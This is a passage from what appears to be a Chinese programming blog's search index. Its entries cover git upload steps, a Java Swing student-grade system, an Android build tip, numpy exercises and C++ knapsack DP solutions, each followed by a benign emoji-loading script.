img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何上传项目到github</title>
      <link href="/2020/09/27/ru-he-shang-chuan-xiang-mu-dao-github/"/>
      <url>/2020/09/27/ru-he-shang-chuan-xiang-mu-dao-github/</url>
      
        <content type="html"><![CDATA[<p>注意：先找到你想要上传的项目,然后在该项目文件夹中开启gitBush,然后因为基本就是所有文件都上传,所以第二部那里直接git add .就可以了,别漏了点</p><pre><code>git init //初始化仓库git add .(文件name) //添加文件到本地仓库git commit -m “first commit” //添加文件描述信息git remote add origin + 远程仓库地址 //链接远程仓库，创建主分支git pull origin master // 把本地仓库的变化连接到远程仓库主分支git push -u origin master //把本地仓库的文件推送到远程仓库</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简易成绩管理系统</title>
      <link href="/2020/09/26/jian-yi-cheng-ji-guan-li-xi-tong/"/>
      <url>/2020/09/26/jian-yi-cheng-ji-guan-li-xi-tong/</url>
      
        <content type="html"><![CDATA[<p><strong><em>项目地址：<a href="https://github.com/1766095699/Student_grades.git" target="_blank" rel="noopener">https://github.com/1766095699/Student_grades.git</a></em></strong></p><h2 id="一-界面效果图"><a href="#一-界面效果图" class="headerlink" title="一.界面效果图"></a>一.界面效果图</h2><img src="https://s1.ax1x.com/2020/09/27/0F3EdK.png" alt="0F3EdK.png" border="0" height="300" width="300/"><img src="https://s1.ax1x.com/2020/09/27/0F3AZ6.png" alt="0F3AZ6.png" border="0" height="300" width="300/"><img src="https://s1.ax1x.com/2020/09/27/0F38df.png" alt="0F38df.png" border="0" height="300" width="300/"><hr><h2 id="二-序言"><a href="#二-序言" class="headerlink" title="二.序言"></a>二.序言</h2><p><strong><em>这是个非常简易的学生管理系统,主要作用还是来了解swing组件的基本运用以及JDBC的基本应用,本文不做代码层面的梳理,在代码中主要部分的代码我已经有了相应的注释,可以在github中查找,下文主要是对项目实现的逻辑整理</em></strong></p><h2 id="三-代码逻辑"><a href="#三-代码逻辑" class="headerlink" title="三.代码逻辑"></a>三.代码逻辑</h2><h3 id="1-该项目中各个包的作用"><a href="#1-该项目中各个包的作用" class="headerlink" title="1.该项目中各个包的作用"></a>1.该项目中各个包的作用</h3><p>entity层：存储和获取信息的类(get,set方法),AdminDO和StudentDO分别存储了用户的信息和学生的信息</p><p>Handler层：里面的方法实现各种点击事件等的逻辑层</p><p>res层：用TableDTO这个类来对数据库中的数据进行储存然后在其他地方调用该类提取数据</p><p>service层：放接口以及一些实现类</p><p>student.view：放界面布局</p><p>uitil：工具层</p><h3 id="2-项目实现逻辑思维导图"><a href="#2-项目实现逻辑思维导图" class="headerlink" title="2.项目实现逻辑思维导图"></a>2.项目实现逻辑思维导图</h3><p><a href="https://imgchr.com/i/0FaJ2T" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0FaJ2T.md.png" alt="1.md.png"></a><br><a href="https://imgchr.com/i/0FwuAs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0FwuAs.md.png" alt="2.md.png"></a><br><a href="https://imgchr.com/i/0FaGGV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0FaGGV.md.png" alt="3.png"></a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬取豆瓣电影评分</title>
      <link href="/2020/09/21/pa-qu-dou-ban-dian-ying-ping-fen/"/>
      <url>/2020/09/21/pa-qu-dou-ban-dian-ying-ping-fen/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>状态机模型</title>
      <link href="/2020/08/12/zhuang-tai-ji-mo-xing/"/>
      <url>/2020/08/12/zhuang-tai-ji-mo-xing/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> dp </category>
          
          <category> 状态机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> dp </tag>
            
            <tag> 状态机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓开源项目环境的环境搭建问题</title>
      <link href="/2020/08/11/an-zhuo-kai-yuan-xiang-mu-huan-jing-de-huan-jing-da-jian-wen-ti/"/>
      <url>/2020/08/11/an-zhuo-kai-yuan-xiang-mu-huan-jing-de-huan-jing-da-jian-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>在学习和模仿开源android项目之前,先检查app的grandle和在外层目录的grandle,特别是app中的grandle,如果SDK的版本高于28会出现相当多的依赖添加失败的问题,即使按照提示编程 androidx 也不管用的话,最好的办法就是去Project Structure里面看开源项目的sdk版本和Tool版本,然后改成对应的版本后再copy依赖到自己的项目中</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 记账本 </category>
          
          <category> 安卓开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开源项目 </tag>
            
            <tag> 环境配置问题 </tag>
            
            <tag> 记账本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组分析一：numpy的使用</title>
      <link href="/2020/08/09/shu-zu-fen-xi-yi-numpy-de-shi-yong/"/>
      <url>/2020/08/09/shu-zu-fen-xi-yi-numpy-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<p><a href="https://crossincode.com/vip/homework/254/" target="_blank" rel="noopener">https://crossincode.com/vip/homework/254/</a></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment" spellcheck="true">#任务1：用 numpy 创建一个 2 * 2 的二维数组 ndarray，指定元素类型为 float，命名为 arr1</span><span class="token keyword">def</span> <span class="token function">assign1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    arr1 <span class="token operator">=</span> np<span class="token punctuation">.</span>ndarray<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span>float<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------assign1-------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#任务二：生成元素全为 0 的 6 * 6 矩阵 arr2；元素全为 1 的 6 * 6 矩阵 arr3；以及 6 * 6 的单位矩阵 arr4（任务提示：单位矩阵对角线元素为 )</span><span class="token keyword">def</span> <span class="token function">assign2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    arr2 <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    arr3 <span class="token operator">=</span> np<span class="token punctuation">.</span>ones<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    arr4 <span class="token operator">=</span> np<span class="token punctuation">.</span>eye<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#生成一个n*n的单位矩阵</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------assign2-------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>arr3<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>arr4<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#任务三:运用 arange 函数生成生成 [0, 10) 区间内，步长为 2 的整数序列 arr5</span><span class="token keyword">def</span> <span class="token function">assign3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    arr5 <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------assign3-------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>arr5<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#任务四：生成 0~10 间的等差数列 arr6，元素个数为 6</span><span class="token keyword">def</span> <span class="token function">assign4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    arr6 <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>    arr6 <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span>endpoint<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#endpoint默认是true,false的话表示是否包括末尾值</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------assign4-------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>arr6<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#任务五：创建一个长度为 10 的随机数组（每个元素都是整数）并将最大值替换为 0</span><span class="token comment" spellcheck="true"># （任务提示：numpy 随机函数为 random，利用 argmax() 得到数组最大值的位置，然后再将此位置数字利用切片替换</span><span class="token keyword">def</span> <span class="token function">assign5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    arr7 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#最小值 最大值 数组size,这样写默认是一维,高维的要加[x,x]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------assign5-------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>arr7<span class="token punctuation">)</span>    mx <span class="token operator">=</span> np<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>arr7<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一维数组的argmax返回的就是最大值所在位置,高维数组中第二个参数axis=0则返回每一行最大值在哪一列,axis=1则返回每一列最大值在那一行</span>    arr7<span class="token punctuation">[</span>mx<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>arr7<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#任务六：计算数组 x = np.array([1,2,3,2,3,4,3,4,5,6]) 和数组 y = np.array([7,2,10,2,7,4,9,4,9,8]) 之间的欧式距离</span><span class="token keyword">def</span> <span class="token function">assign6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 这个是直接用欧式距离公式直白写法</span>    dist <span class="token operator">=</span> np<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span>np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>np<span class="token punctuation">.</span>square<span class="token punctuation">(</span>x <span class="token operator">-</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># numpy自带求欧式距离方法</span>    dist1 <span class="token operator">=</span> np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>norm<span class="token punctuation">(</span>x <span class="token operator">-</span> y<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------assign6-------------------"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dist<span class="token punctuation">,</span>dist1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#任务七:利用 seed 生成一组固定的随机数 np.random.seed(1) (阅读参考文章⑫），并用此组成模拟的资金价值曲线 values = np.random.randn(1000).cumsum()</span><span class="token comment" spellcheck="true">#请利用 matplotlib 作出该资金价值曲线图</span><span class="token keyword">def</span> <span class="token function">assign7</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>    values <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cumsum<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-----------------assign7-------------------"</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dpi<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#缺省x的时候那么x默认长度为len(y)</span>    plt<span class="token punctuation">.</span>tick_params<span class="token punctuation">(</span>labelsize<span class="token operator">=</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#控制坐标轴字体大小</span>    plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">"Day"</span><span class="token punctuation">,</span>fontsize <span class="token operator">=</span> <span class="token number">19</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">"Values"</span><span class="token punctuation">,</span>fontsize <span class="token operator">=</span> <span class="token number">19</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>    ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># ax.set_xlim(1, )</span>    <span class="token comment" spellcheck="true"># ax.set_ylim(1, )</span>    plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># #附加任务八：求最大回撤率</span>    <span class="token comment" spellcheck="true"># max_drawdown = np.max(np.maximum.accumulate(values) - values)</span>    <span class="token comment" spellcheck="true"># print(max_drawdown)</span>assign1<span class="token punctuation">(</span><span class="token punctuation">)</span>assign2<span class="token punctuation">(</span><span class="token punctuation">)</span>assign3<span class="token punctuation">(</span><span class="token punctuation">)</span>assign4<span class="token punctuation">(</span><span class="token punctuation">)</span>assign5<span class="token punctuation">(</span><span class="token punctuation">)</span>assign6<span class="token punctuation">(</span><span class="token punctuation">)</span>assign7<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据分析 </tag>
            
            <tag> numpy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>背包模型进阶篇</title>
      <link href="/2020/08/07/bei-bao-mo-xing-jin-jie-pian/"/>
      <url>/2020/08/07/bei-bao-mo-xing-jin-jie-pian/</url>
      
        <content type="html"><![CDATA[<h2 id="一-二维01背包问题"><a href="#一-二维01背包问题" class="headerlink" title="一. 二维01背包问题"></a>一. 二维01背包问题</h2><p><strong><em>宠物小精灵之收服 : <a href="https://www.acwing.com/problem/content/1024/" target="_blank" rel="noopener">https://www.acwing.com/problem/content/1024/</a></em></strong></p><h3 id="一-模型定义"><a href="#一-模型定义" class="headerlink" title="一.模型定义"></a>一.模型定义</h3><p><strong><em>一维背包问题是n个物品中选,求总体积不超过V的最大价值<br>二维背包问题不过是多加了一个和V同属性的条件</em></strong></p><h3 id="二-代码解析"><a href="#二-代码解析" class="headerlink" title="二.代码解析"></a>二.代码解析</h3><p>在01背包的模板下多加一层嵌套即可,其他都一样</p><h3 id="三-AC代码"><a href="#三-AC代码" class="headerlink" title="三.AC代码"></a>三.AC代码</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token keyword">const</span> N<span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//f[i][j]表示精灵球数量花费不大于i，皮卡丘体力消耗不大于j的状态下捕获最多精灵的个数 </span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> V1<span class="token punctuation">,</span>V2<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>V1<span class="token operator">>></span>V2<span class="token operator">>></span>n<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//V1是精灵球初始数量，V2是皮卡丘初始体力 </span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> v1<span class="token punctuation">,</span>v2<span class="token punctuation">;</span>        cin<span class="token operator">>></span>v1<span class="token operator">>></span>v2<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//v1表示需要花费的精灵球数，v2表示消耗的皮卡丘体积 </span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>V1<span class="token punctuation">;</span>j<span class="token operator">>=</span>v1<span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> h<span class="token operator">=</span>V2<span class="token number">-1</span><span class="token punctuation">;</span>h<span class="token operator">>=</span>v2<span class="token punctuation">;</span>h<span class="token operator">--</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//皮卡丘体力到0就不能抓精灵了所以能消耗的体力值是V2-1 </span>                f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>v1<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token operator">-</span>v2<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>f<span class="token punctuation">[</span>V1<span class="token punctuation">]</span><span class="token punctuation">[</span>V2<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> k<span class="token operator">=</span>V2<span class="token number">-1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>k<span class="token operator">></span><span class="token number">0</span><span class="token operator">&amp;&amp;</span>f<span class="token punctuation">[</span>V1<span class="token punctuation">]</span><span class="token punctuation">[</span>V2<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">==</span>f<span class="token punctuation">[</span>V1<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>k<span class="token operator">--</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//一定是要和k-1比较，因为k-1是下一项，如果相等再k--,找到皮卡丘消耗的最小体力值</span>    cout<span class="token operator">&lt;&lt;</span>V2<span class="token operator">-</span>k<span class="token punctuation">;</span> <span class="token punctuation">}</span> </code></pre><h2 id="二-方案数问题：01背包的恰好型数量问题"><a href="#二-方案数问题：01背包的恰好型数量问题" class="headerlink" title="二.方案数问题：01背包的恰好型数量问题"></a>二.方案数问题：01背包的恰好型数量问题</h2><p><strong><em>数字组合<a href="https://www.acwing.com/problem/content/description/280/" target="_blank" rel="noopener">https://www.acwing.com/problem/content/description/280/</a></em></strong>  </p><h3 id="1-模型含义"><a href="#1-模型含义" class="headerlink" title="1.模型含义"></a>1.模型含义</h3><p>从n个数(物品)中出恰好满足某条件的<strong><em>数量</em></strong></p><h3 id="2-代码分析"><a href="#2-代码分析" class="headerlink" title="2.代码分析"></a>2.代码分析</h3><p>dp[i]表示和i的方案数</p><h3 id="3-AC代码"><a href="#3-AC代码" class="headerlink" title="3.AC代码"></a>3.AC代码</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//f[i]表示和为i的方案数</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">,</span>v<span class="token punctuation">;</span>        cin<span class="token operator">>></span>n<span class="token operator">>></span>m<span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//和为0的情况只有一种</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cin<span class="token operator">>></span>v<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>m<span class="token punctuation">;</span>j<span class="token operator">>=</span>v<span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//01背包问题逆向循环,一个数只能用一次</span>            f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">=</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>f<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//https://www.acwing.com/problem/content/280/ </span><span class="token comment" spellcheck="true">//f[j]是由f[j-v]转移过来</span><span class="token comment" spellcheck="true">//处理组合问题中恰好类型的问题</span></code></pre><h2 id="三-方案数问题：完全背包的恰好型数量问题"><a href="#三-方案数问题：完全背包的恰好型数量问题" class="headerlink" title="三.方案数问题：完全背包的恰好型数量问题"></a>三.方案数问题：完全背包的恰好型数量问题</h2><p><strong><em>买书 <a href="https://www.acwing.com/problem/content/1025/" target="_blank" rel="noopener">https://www.acwing.com/problem/content/1025/</a></em></strong></p><h3 id="一-模型含义"><a href="#一-模型含义" class="headerlink" title="一.模型含义"></a>一.模型含义</h3><p>在n种物品,每种可以选无限多,问恰好满足某一条件的方案数</p><h3 id="二-代码分析"><a href="#二-代码分析" class="headerlink" title="二.代码分析"></a>二.代码分析</h3><p>dp[i][j]表示从前i件商品里选花费了j元时的方案书,对于每本书有卖和不买两种情况<br><strong><em>注:方案书问题一定要记得初始化,且完全背包问题时正向循环</em></strong></p><h3 id="三-AC代码-1"><a href="#三-AC代码-1" class="headerlink" title="三.AC代码"></a>三.AC代码</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">1010</span><span class="token punctuation">;</span><span class="token keyword">int</span> v<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token 